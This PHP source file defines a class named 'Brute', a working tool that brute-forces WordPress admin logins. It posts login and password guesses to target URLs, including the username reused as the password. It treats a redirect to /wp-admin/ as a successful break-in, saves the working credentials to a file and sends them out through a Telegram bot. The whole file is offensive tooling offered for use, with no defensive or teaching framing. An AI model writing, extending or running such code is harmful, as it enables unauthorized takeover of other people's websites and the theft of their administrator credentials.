<?php

namespace app;

use Amp\Dns\DnsException;
use Amp\Http\Client\Body\FormBody;
use Amp\Http\Client\HttpClientBuilder;
use Amp\Http\Client\Request;
use Amp\Http\Client\Response;
use Monolog\Handler\TelegramBotHandler;
use Monolog\Logger;
use Throwable;

class Brute
{
    public function __construct()
    {
        $this->client = (new HttpClientBuilder())
            ->retry(3)
            ->followRedirects(2)
            ->build();
    }

    public function handle($data) {
        $url = explode(';', $data['url'])[0];

        $login      = $this->loginCheck($data);
        $password   = $this->passwordCheck($data, $login);
        $iteration  = $this->checkIterator($data, $login, $password);

        if ($iteration == true) {
            $body = new FormBody;
            $body->addField('log', $login);
            $body->addField('pwd', $password);

            $request = new Request($url, 'POST');
            $request->setTcpConnectTimeout(2400);
            $request->setBody($body);

            $response = yield $this->client->request($request);

            $locations = [];
            while (null !== $response) {
                $locations = array_merge($locations, $response->getHeaderArray('Location'));
                $response = $response->getPreviousResponse();
            }

            $authorized = count(array_filter($locations, fn (string $location) => str_contains($location, '/wp-admin/'))) > 0;

            $wp_admin = "{$url};{$login};{$password}";
            if ($authorized == true) {
                Log::info("Valid: {$wp_admin}");
                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);

                try {
                    yield (new Telegram())->sendMessage($wp_admin);
                } catch (\Throwable $t) {
                    Log::error(sprintf('Unable to log in telegram due to %s at %s:%d', $t->getMessage(), $t->getFile(), $t->getLine()));
                }
            } else {
                Log::debug("Invalid: {$wp_admin}");
            }
        }
    }

    public function __invoke($data)
    {

        try {
            yield from $this->handle($data);
        } catch (DnsException $e) {
            $this->write('brute-fail', explode(';', $data['url'])[0] . ';' . $data['login'] . ':' . $data['password']);
        } catch (
        \Amp\Http\Client\Connection\UnprocessedRequestException
        | \Amp\Http\Client\SocketExceptionReceiving
        | \Amp\Http\Client\TimeoutException
        | \Amp\Http\Client\Connection\Http2ConnectionException
        | \Amp\Http\Client\Connection\Http2StreamException
        | \Amp\Http\Client\Interceptor\TooManyRedirectsException
        | \Amp\Http\Client\SocketException $e
        ) {
            Log::warning($e->getMessage());
        } catch (Throwable $e) {
            Log::error($e);
        }





    }

    public function checkIterator($data, $login, $password)
    {
        if (( $login == null || $password == null) || ( $data['login'] != '{login}' && $data['login'] == $login )) {
            return false;
        } else {
            return true;
        }
    }

    public function loginCheck($data)
    {
        if ($data['login'] == '{login}' && !isset(explode(';', $data['url'])[1])) {
            return null;
        } elseif ($data['login'] == '{login}' && isset(explode(';', $data['url'])[1])) {
            return explode(';', $data['url'])[1];
        } else {
            return $data['login'];
        }
    }

    public function passwordCheck($data, $login)
    {
        if ($data['password'] == '{login}' && $login != null)
            return $login;
        else
            return $data['password'];
    }
}